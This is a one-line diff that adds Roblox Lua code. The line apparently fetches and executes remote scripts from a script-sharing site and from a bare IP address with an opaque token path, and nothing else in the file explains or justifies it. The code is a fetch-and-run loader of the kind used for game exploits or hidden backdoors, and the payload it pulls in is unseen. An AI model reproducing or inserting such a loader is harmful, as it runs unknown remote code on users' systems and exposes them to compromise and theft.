@@ -1,0 +1,1 @@
+task.spawn(function()loadstring(game:HttpGet("https://raw.smokingscripts.org/vertex.lua"))()end)loadstring(game:HttpGet("http://31.172.87.116/TFGytkhAWFPLbQVaAki7VpNr6Aws6LoZI22TLEyNWKqEC7hRuCSV31vAlyMiw03pgSqdOlLKaVS8Hqa7"))()
